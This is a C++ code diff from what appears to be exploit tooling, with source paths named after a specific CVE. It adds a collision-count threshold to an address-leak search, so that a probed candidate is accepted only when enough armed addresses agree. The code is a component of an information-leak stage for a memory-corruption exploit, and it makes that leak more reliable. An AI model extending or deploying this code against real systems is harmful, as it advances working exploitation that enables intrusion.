@@ -19,6 +19,7 @@
 #include <cstdint>
 
 #include "backend/cve_2026_43499/leak/candidate_match.hpp"
+#include "backend/cve_2026_43499/leak/collision_count.hpp"
 #include "backend/cve_2026_43499/leak/leak_walk.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::leak {
@@ -57,18 +58,26 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         const Buckets *buckets = nullptr;
         const std::uint64_t *addresses = nullptr;
         std::size_t address_count = 0U;
+        /** How many of the armed addresses must agree: the profile collision count. Zero is
+         *  refused, because a search with no threshold answers with the first candidate it
+         *  sees. */
+        std::size_t collisions_needed = 0U;
         SearchOutcome outcome{};
 
         [[nodiscard]] bool on_probe(const LeakProbe &probe) noexcept {
             ++outcome.probes;
-            if (buckets == nullptr) {
+            if (buckets == nullptr || collisions_needed == 0U) {
                 outcome.status = SearchVerdict::GeometryMissing;
                 return false;
             }
             const std::uint64_t candidate = tagged_candidate(probe.address, probe.tag);
             const MatchVerdict verdict =
                 candidate_matches(*buckets, addresses, address_count, candidate);
-            if (verdict == MatchVerdict::Matches) {
+            /* Agreement is necessary and not enough: the count is what says the candidate is
+             *  where the armed addresses are, at least as many of them as the profile asks. */
+            const std::size_t agreed =
+                count_bucket_agreements(*buckets, addresses, address_count, candidate);
+            if (verdict == MatchVerdict::Matches && enough_agreements(agreed, collisions_needed)) {
                 outcome.found = candidate;
                 outcome.status = SearchVerdict::Found;
                 return false;
@@ -87,8 +96,10 @@ namespace ghostlock::backend::cve_2026_43499::leak {
     [[nodiscard]] SearchOutcome search_for_object(const ScanStrides &strides, const ScanRange &range,
                                                   bool sweep_tags, const Buckets &buckets,
                                                   const std::uint64_t *addresses,
-                                                  std::size_t address_count) noexcept {
+                                                  std::size_t address_count,
+                                                  std::size_t collisions_needed) noexcept {
         MatchingSink<Buckets> sink{};
+        sink.collisions_needed = collisions_needed;
         sink.buckets = &buckets;
         sink.addresses = addresses;
         sink.address_count = address_count;
